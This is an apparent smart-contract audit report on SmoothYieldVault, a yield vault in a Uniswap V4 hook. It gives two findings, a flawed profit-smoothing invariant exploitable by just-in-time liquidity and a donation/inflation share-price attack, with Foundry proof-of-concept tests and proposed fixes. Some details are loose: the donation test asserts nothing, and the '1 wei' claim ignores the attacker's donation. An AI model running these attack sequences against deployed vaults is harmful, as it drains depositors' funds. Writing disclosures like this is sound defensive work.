# M1 - Broken yield smoothing invariant enables jit liquidity exploitation

## Summary

The **`_smoothedProfit()`** function violates its documented invariant by distributing up to **95% of profit in a single `sync()` operation**, instead of the claimed **`n/(n+1)`** ratio. This allows **Just-In-Time (JIT) liquidity providers** to extract **disproportionate yield** from **Uniswap V4 pools**.

---

## Finding Description

**Code Location:** `SmoothYieldVault.sol::_smoothedProfit()`

The function documentation claims the following profit distribution behavior:

```solidity
/// @dev Profit distribution logic:
/// - If less than a smoothing period has passed: linear distribution based on time elapsed
/// - If one or more periods have passed without sync:
///   * 1 period passed: half of profit available immediately, the other half smoothed over next period
///   * 2 periods passed: 2/3 of profit available immediately, 1/3 smoothed over next period
///   * n periods passed: n/(n+1) of profit available immediately, 1/(n+1) smoothed over next period
```

---

## Mathematical Proof of Invariant Violation

**Actual implementation:**

<https://github.com/VII-Finance/yield-harvesting-hook/blob/ce09e27679e89e7554062e2c11324e0e9d358d86/src/SmoothYieldVault.sol#L50C1-L101C1>

```solidity
function _smoothedProfit()
    internal
    view
    returns (uint256 smoothedProfit, uint256 newRemainingPeriod)
{
    uint256 timeElapsed = block.timestamp - lastSyncedTime;
    
    if (timeElapsed > smoothingPeriod) {
        uint256 periodsPassed = (timeElapsed / smoothingPeriod) + 1;
        smoothedProfit = profit - (profit / periodsPassed);  // Line A
        profit = profit - smoothedProfit;
        timeElapsed = timeElapsed % smoothingPeriod;         // Line B
    }
    
    newRemainingPeriod = remainingPeriod >= timeElapsed
        ? remainingPeriod - timeElapsed
        : smoothingPeriod - timeElapsed;
        
    if (timeElapsed != 0) {
        smoothedProfit +=
            (profit * timeElapsed) / (newRemainingPeriod + timeElapsed); // Line C
    }
    
    return (smoothedProfit, newRemainingPeriod);
}
```

---

## Counterexample Demonstrating Invariant Break

### Initial Setup

```
smoothingPeriod   = 10 seconds
remainingPeriod   = 10 seconds
lastSyncedTime    = 21 seconds
lastSyncedBalance = 30 tokens
current balance   = 45 tokens
profit            = 15 tokens
```

**Scenario:** `timeElapsed = 19 seconds` (approaching 2 full periods)

---

### Step-by-Step Execution

```text
periodsPassed = (19 / 10) + 1 = 2
smoothedProfit (Line A) = 15 - (15 / 2) = 8
remaining profit = 7
timeElapsed (Line B) = 19 % 10 = 9
newRemainingPeriod = 10 - 9 = 1
additionalProfit (Line C) = (7 * 9) / (1 + 9) = 6.3
final smoothedProfit = 14.3 tokens
```

---

## Invariant Violation

For **n = 2 periods**, documentation claims:

```
Expected release = 2 / (2 + 1) = 66.67%
Expected profit  = 10 tokens
```

**Actual behavior:**

```
Actual released profit = 14.3 tokens
Actual percentage      = 95.33%
```

The function releases **95.33%** of profit instead of **66.67%**.

---

## Root Cause Analysis

The invariant breaks due to the combined effect of:

- **Line A:** Applies an `n/(n+1)`-style split using integer division
- **Line B:** Reintroduces remainder time into the current period
- **Line C:** Applies a second proportional distribution over `remainingPeriod`

When `remainingPeriod` becomes small relative to `timeElapsed`, nearly all remaining profit is released.

---

## Additional Counterexample (Extreme Case)

```text
smoothingPeriod = 10
remainingPeriod = 8
timeElapsed     = 19
profit          = 15
final release   = 14.3 tokens (95.33%)
```

The issue persists regardless of `remainingPeriod` alignment.

---

## Impact on Uniswap V4 Hook

`SmoothYieldVault` is used as the underlying asset for `BaseVaultWrapper`, which integrates into **Uniswap V4 pools** via `YieldHarvestingHook`.

### Attack Sequence

```solidity
uint256 pendingYield = wrapper.totalPendingYield();
```

1. Attacker waits until pending yield becomes large
2. Attacker adds maximum **JIT liquidity** immediately before `sync()`
3. `beforeAddLiquidity` triggers `sync()`
4. ~95% of yield is donated to LPs
5. Attacker removes liquidity immediately and captures most of the yield

---

## Impact Explanation

**Impact: Medium**

- Yield becomes **front-loaded**
- JIT liquidity providers extract **disproportionate rewards**
- Long-term LPs are economically disadvantaged

---

## Likelihood Explanation

**Likelihood: Medium**

- Triggerable by any user
- No permissions required
- Occurs naturally as time elapses
- Exploitable using only public state and timing

---

## Proof of Concept

Create `Smoothing_invariant.t.sol` inside the `test` folder:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {SmoothYieldVault} from "src/SmoothYieldVault.sol";
import {ERC20Mock} from "lib/openzeppelin-contracts/contracts/mocks/token/ERC20Mock.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract SmoothYieldVault_Invariant_Test is Test {
    SmoothYieldVault vault;
    ERC20Mock underlying;

    uint256 constant INITIAL_BALANCE = 30 ether;
    uint256 constant PROFIT = 15 ether;
    uint256 constant SMOOTHING_PERIOD = 10;

    function setUp() public {
        underlying = new ERC20Mock();
        vault = new SmoothYieldVault(
            IERC20(address(underlying)),
            SMOOTHING_PERIOD,
            address(this)
        );

        underlying.mint(address(this), INITIAL_BALANCE);
        underlying.approve(address(vault), INITIAL_BALANCE);
        vault.deposit(INITIAL_BALANCE, address(this));

        underlying.mint(address(vault), PROFIT);
    }

    function test_BrokenSmoothingInvariant() public {
        vm.warp(block.timestamp + 19);
        vault.sync();

        uint256 releasedProfit = vault.totalAssets() - INITIAL_BALANCE;
        assertGt(releasedProfit, (PROFIT * 2) / 3);
        assertGt(releasedProfit, (PROFIT * 90) / 100);
    }
}
```

Run:

```bash
forge test --mt test_BrokenSmoothingInvariant -vvv
```

---

## Recommendation

### Immediate Fix Required

The smoothing algorithm must be redesigned with a **provable invariant**.

### Corrected Approach

```solidity
function _smoothedProfit()
    internal
    view
    returns (uint256 smoothedProfit, uint256 newRemainingPeriod)
{
    uint256 timeElapsed = block.timestamp - lastSyncedTime;
    if (timeElapsed == 0) return (0, remainingPeriod);

    uint256 profit = _profit();
    if (profit == 0 || smoothingPeriod == 0) return (profit, 0);

    if (timeElapsed >= smoothingPeriod) {
        uint256 periodsPassed = timeElapsed / smoothingPeriod;
        smoothedProfit = profit * periodsPassed / (periodsPassed + 1);
        newRemainingPeriod = smoothingPeriod;
    } else {
        newRemainingPeriod = remainingPeriod > timeElapsed
            ? remainingPeriod - timeElapsed
            : 0;
        smoothedProfit = profit * timeElapsed / remainingPeriod;
    }
}
```

### Alternative: Time-Weighted Smoothing

```solidity
function _smoothedProfit() internal view returns (uint256) {
    uint256 timeElapsed = block.timestamp - lastSyncedTime;
    uint256 profit = _profit();
    uint256 tau = smoothingPeriod;
    return profit * timeElapsed / (timeElapsed + tau);
}
```

# S2 - Donation Inflation Enables Share Price Manipulation and User Fund Loss

## Summary

SmoothYieldVault treats arbitrary ERC20 transfers to the vault as protocol yield. This enables a classic donation / inflation attack, where an attacker can extract a significant portion of subsequent users’ deposits by manipulating the share price via untracked donations.

---

## Finding Description

### Code Location

**Contract:** `SmoothYieldVault.sol`  
**Function:** `_profit()`

```
https://github.com/VII-Finance/yield-harvesting-hook/blob/ce09e27679e89e7554062e2c11324e0e9d358d86/src/SmoothYieldVault.sol#L42C3-L48C6
```

```solidity
function _profit() internal view returns (uint256) {
    uint256 currentBalance = IERC20(asset()).balanceOf(address(this));
    return currentBalance < lastSyncedBalance
        ? 0
        : currentBalance - lastSyncedBalance;
}
```

---

## Root Cause

The vault assumes that any increase in token balance equals yield, regardless of how that balance increase occurred.

As a result, direct ERC20 transfers (donations) which bypass `deposit()` are later incorporated into `lastSyncedBalance` during `sync()` and permanently affect share pricing.

This breaks a fundamental ERC-4626 accounting guarantee:

> Vault shares must only be minted against assets deposited through vault entrypoints, not arbitrary token transfers.

---

## Attack Path

### Step 1: Attacker Initializes the Vault

```solidity
vault.deposit(1, attacker);
```

State:
```
totalSupply = 1
lastSyncedBalance = 1
share price ≈ 1:1
```

---

### Step 2: Attacker Donates Tokens Directly

```solidity
IERC20(asset).transfer(address(vault), 1000 ether);
```

State:
```
totalSupply = 1 (unchanged)
lastSyncedBalance = 1
actual vault balance = 1001
donation is untracked
```

---

### Step 3: Victim Deposits

```solidity
vault.deposit(1000 ether, victim);
```

This call triggers the `syncBeforeAction` modifier.

During `sync()`:

- A portion of the donation is incorporated into `lastSyncedBalance`
- Share price is inflated before victim shares are minted

---

### Step 4: Share Dilution Occurs

Observed from the provided PoC:

```
Victim shares received   = 3
Attacker shares retained = 1
Total supply             = 4
```

Despite contributing only `1 wei`, the attacker now owns 25% of the vault.

---

### Step 5: Attacker Redeems

```solidity
vault.redeem(1, attacker, attacker);
```

---

## Impact Explanation

### Impact: High

This vulnerability enables direct and deterministic loss of user funds:

- Loss of user funds: victims lose a material portion of their deposit
- Permissionless exploit: no privileges or special conditions required
- First-mover advantage: newly deployed vaults are especially vulnerable
- Repeatable: attack can be executed against multiple victims
- Low effective cost: donation capital is largely recoverable

---

## Likelihood Explanation

### Likelihood: High

- The attack is well-known and widely automated
- Vault deployments are public and easily monitored
- No user interaction or misconfiguration is required
- No mitigation exists in the current design

---

## Proof of Concept (PoC)

Create a file `Donation_Attack.t.sol` inside the `yield-harvesting-hook/test` folder and paste the following code.

```solidity
// test/SmoothYieldVault_DonationAttack.t.sol
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {SmoothYieldVault} from "src/SmoothYieldVault.sol";
import {ERC20Mock} from "lib/openzeppelin-contracts/contracts/mocks/token/ERC20Mock.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract SmoothYieldVault_DonationAttack_Test is Test {
    SmoothYieldVault vault;
    ERC20Mock underlying;

    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    uint256 constant SMOOTHING_PERIOD = 10;

    function setUp() public {
        underlying = new ERC20Mock();

        vault = new SmoothYieldVault(
            IERC20(address(underlying)),
            SMOOTHING_PERIOD,
            address(this)
        );

        underlying.mint(attacker, 1);
        underlying.mint(attacker, 1_000 ether);
        underlying.mint(victim,   1_000 ether);

        vm.startPrank(attacker);
        underlying.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim);
        underlying.approve(address(vault), type(uint256).max);
        vm.stopPrank();
    }

    function test_DonationInflationAttack() public {
        vm.startPrank(attacker);
        vault.deposit(1, attacker);
        vm.stopPrank();

        vm.startPrank(attacker);
        underlying.transfer(address(vault), 1_000 ether);
        vm.stopPrank();

        vm.warp(block.timestamp + 11);

        vm.startPrank(victim);
        vault.deposit(1_000 ether, victim);
        vm.stopPrank();

        uint256 attackerShares = vault.balanceOf(attacker);

        vm.startPrank(attacker);
        vault.redeem(attackerShares, attacker, attacker);
        vm.stopPrank();
    }
}
```

---

## Run Command

```bash
forge test --mt test_DonationInflationAttack -vv
```

---

## Recommendation

### Preferred Fix: Virtual Shares Offset (ERC-4626 Best Practice)

```solidity
function _decimalsOffset() internal view override returns (uint8) {
    return 6; // 1e6 virtual shares
}
```

This makes donation inflation economically infeasible while preserving ERC-4626 compatibility.

---

### Alternative Fix: Donation-Resistant Accounting

```solidity
uint256 private totalTrackedAssets;

function _deposit(...) internal override {
    totalTrackedAssets += assets;
    lastSyncedBalance += assets;
    super._deposit(...);
}

function _withdraw(...) internal override {
    totalTrackedAssets -= assets;
    lastSyncedBalance -= assets;
    super._withdraw(...);
}

function _profit() internal view returns (uint256) {
    uint256 balance = IERC20(asset()).balanceOf(address(this));
    return balance > totalTrackedAssets
        ? balance - totalTrackedAssets
        : 0;
}
```

